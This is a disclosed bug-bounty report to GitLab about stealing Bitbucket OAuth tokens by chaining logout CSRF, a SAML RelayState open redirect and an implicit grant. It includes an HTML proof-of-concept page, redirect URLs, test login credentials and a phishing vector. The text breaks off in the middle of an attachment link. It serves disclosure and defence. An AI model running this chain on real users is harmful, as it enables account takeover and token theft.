{
  "id": 1923672,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTIzNjcy",
  "url": "https://hackerone.com/reports/1923672",
  "title": "Account takeover due to insufficient URL validation on RelayState parameter",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-03-29T13:01:19.265Z",
  "submitted_at": "2023-03-29T13:01:19.598Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bull",
    "url": "/bull",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-05-30T08:46:24.008Z",
  "bug_reporter_agreed_on_going_public_at": "2023-05-17T11:56:26.900Z",
  "team_member_agreed_on_going_public_at": "2023-05-30T08:46:23.850Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\n\n\nI have found an issue which can be used by an attacker to steal Bitbucket access token along with Other third party access tokens(google, salesforce etc). But the most important one is bitbucket. \n\n\nIssue:\n=====\n\n\n* there is open redirect while loggin to gitlab Via SAML, while the Open redirect is not much impactful since it is a post based request coming from third party domain, but the redirect happens and is also saved along in the gitlab cookies while being redirect and next time user visits `gitlab.com/user/sign_in`, he is automatically sent to the redirect\n\n\n### open redirect:\n{F2260468}\n\n\nThis chain can be used to steal third party access token `login with google, github, bitbucket, twitter, salesforce ....... etc` but we will focus on bitbucket for the following reason:\n\nIt has the presaved oauth scopes which is wide and also the client id is same as that of when you use the import project from bitbucket feature:\n\n{F2260558}\n\n\nScope : (Read acccess to all data in account and some write access, projects's wikis):\n\n{F2260561}\n\n\nsimilar is the case for Github, but Github doesn't allow implicit grant. \n\n### implicit grant for bitbucket:\n\nthis simply returns access token as bearer to attacker's domain , which can be used to access full bitbucket api.\n\nThis makes both users vulnerable,:\n`people who chose to log in with bitbucket`\n`people who chose other means of login, but have previously imported project from bitbucket into gitlab`\n\nPOC:\n=====\n\n ### As victim:\n\n make sure you have previously used bitbucket with gitlab, weather for login with bitbucket or for importing project.\n\n\n### As attacker:\n\n* setup a group with SAML Login and setup a user to log into gitlab with SAML\n\nHere are my credentials for triage purposes: (Please note i will revoke these credentials upon triage, let me know if you need them longer or dont need them at all)\n\nhttps://bugcrowd-iambull-2.oktapreview.com/\n\nusername: `gitlab@gitlab.com`\npassword : `Gliatb4passtbx!`\n\nsecurity answer: `Gliatb`\n\n\n\n\nPOC:\n=====\n\n\n* log victim out with Logout CSRF\n\n* use SAML creds to save open redirect for victim:\n\nhttps://bugcrowd-iambull-2.oktapreview.com/app/bugcrowd-iambull-2_gitlabcom_1/exk1lit3jovMjvewh0h8/sso/saml?RelayState=.witcoat.com\n\n* initiate bitbucket oauth by changing response_type to `token`\n\nhttps://bitbucket.org/site/oauth2/authorize?client_id=b9jLmh8WCLZPBAwWba&redirect_uri=https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response_type=token&state=DoesNotMatter\n\n* try using stolen bitbucket api:\n\n```\nGET /2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D HTTP/2\nHost: api.bitbucket.org\nUser-Agent: curl/7.79.1\nAccept: */*\nAuthorization: Bearer Txpo3AXXQZHlp....\n\n```\n\n\n\n\nhere is the poc for doing everything step by step, **please note all this can be automated with window.open for 1 click exploit**\n\n\n```\n<html>\n<title>GitLab</title>\n\n\n<body>\n\t\n<span>Logout of gitlab if logged in:</span>\n\n<form action=\"https://gitlab.com/users/sign_out\" target=\"_blank\" method=\"post\"><button>Logout Gitlab Account</button></form>\n\n<br>\n<br>\n<br>\n<br>\n\n<span>Open redirect via SAML:</span>\n\n<form action=\"https://bugcrowd-iambull-2.oktapreview.com/app/bugcrowd-iambull-2_gitlabcom_1/exk1lit3jovMjvewh0h8/sso/saml\" target=\"_blank\" method=\"get\">\n\t<input type=\"hidden\" name=\"RelayState\" value=\".witcoat.com\" /> \n\t<button>Save Open Redirect</button></form>\n<br>\n\n\n<span>steal oauth access Token For Bitbucket:</span>\n\n<form action=\"https://bitbucket.org/site/oauth2/authorize\" target=\"_blank\" method=\"get\">\n\t<input type=\"hidden\" name=\"client_id\" value=\"b9jLmh8WCLZPBAwWba\" /> \n  <input type=\"hidden\" name=\"redirect_uri\" value=\"https://gitlab.com/users/auth/bitbucket/callback\" /> \n  <input type=\"hidden\" name=\"response_type\" value=\"token\" /> \n    <input type=\"hidden\" name=\"state\" value=\"Doesnotmatter\" /> \n\n\n\t<button>Steal Bitbucket Code</button>\n</form>\n\n\n</body>\n\n\n\n</html>\n```\n\n\n\nhere is the video of going through steps:\n\n{F2260621}\n\n## Phishing Vector:\n\nUpon saving open redirect into the cookies, when the user clicks signin on `about.gitlab.com` he will be redirected to external domain to steal credentials:\n\n{F2260648}\n\n\n\nPlease let me know if you need any more information or if i missed something\nthanks\nBull\n\n## Impact\n\nSteal bitbucket access token, which can be used to import victim's any repository, and also write access to victim's any wiki in bitbucket, \nalso this can be used to steal access tokens for other providers such as google, salesforce twitter etc.....\n\nAlso this can be used to phish users",
  "bounty_amount": "2450.0",
  "formatted_bounty": "$2,450",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 2260468,
      "file_name": "Screenshot_2023-03-29_at_4.14.02_PM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mtg3ucvru5xgyj6t3bf1prjobyyv?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-03-29_at_4.14.02_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-03-29_at_4.14.02_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5cd14e780f628a4e43dc839d70d2ab94aa0ee81c9f5f6a03c81d73d9dced731e",
      "file_size": 716041,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 2260558,
      "file_name": "Screenshot_2023-03-29_at_4.43.25_PM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wgos378hb7794ucpq6nl6seyoca1?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-03-29_at_4.43.25_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-03-29_at_4.43.25_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3ebb0cff624f791d5d8df89a508bdae9ac5faa578a639a4ef48b9a4190997065",
      "file_size": 159296,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 2260561,
      "file_name": "Screenshot_2023-03-29_at_1.46.27_PM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8zivjx14byn3awtfj788699evxc9?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-03-29_at_1.46.27_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-03-29_at_1.46.27_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1016baff0dfe894b16e6d58355fff3abbfa477bfaa5d6146065e511990ba5f42",
      "file_size": 301075,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 2260621,
      "file_name": "f_gitlab.mov",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gvxxbp1depx21fj0avdh6w4yt2az?response-content-disposition=attachment%3B%20filename%3D%22f_gitlab.mov%22%3B%20filename%2A%3DUTF-8%27%27f_gitlab.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c6d94a0a5a92c41da756a4748a2b98f2dacaef318f8cf13b2a9a2134ea8b1067",
      "file_size": 70331419,
      "type": "video/quicktime",
      "moderated": null
    },
    {
      "id": 2260648,
      "file_name": "phish_g.mov",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9zz8z0ceezf4fubam3tqba945xdu?response-content-disposition=attachment%3B%20filename%3D%22phish_g.mov%22%3B%20filename%2A%3DUTF-8%27%27phish_g.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b3544ef7ffbb4cd15c1a5bc0f79f19bd1a68b7d213c4691d2ef5f6084bfe6796",
      "file_size": 11443468,
      "type": "video/quicktime",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 79,
  "voters": [
    "8910jq",
    "maskopatol",
    "n1m0",
    "similardisaster",
    "haxor31337",
    "zy9ard3",
    "bl4de",
    "neil-tsakatsa",
    "ta8ahi",
    "shubham_srt",
    "and 69 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 21029845,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @bull,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@h1_analyst_jan",
      "automated_response": false,
      "created_at": "2023-03-30T08:11:02.208Z",
      "updated_at": "2023-03-30T08:11:02.208Z",
      "actor": {
        "username": "h1_analyst_jan",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_jan",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/r0oas02hu1jrgp0gtezdaikmofag/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21032374,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "Hello @bull,\n\nThank you for your report!\n\nOn reproducing the issue, I noticed on following both the links to `Save Open Redirect` and `Steal BitBucket code` both threw the following error Authorising the Gitlab account.\n{F2262148}\n\nCan you please review your submission once again to check whether POC uploaded is still working? \n\nWe would love to take another look at your report once you have provided additional information supporting your issue.\n\nThanks,\n@h1_analyst_jan",
      "automated_response": false,
      "created_at": "2023-03-30T08:26:00.302Z",
      "updated_at": "2023-03-30T08:26:00.302Z",
      "actor": {
        "username": "h1_analyst_jan",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_jan",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/r0oas02hu1jrgp0gtezdaikmofag/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 2262148,
          "filename": "Screenshot_2023-03-30_at_1.40.51_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ieiy95gy7jwbeq8jagdoi6gwg5vi?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-03-30_at_1.40.51_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-03-30_at_1.40.51_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd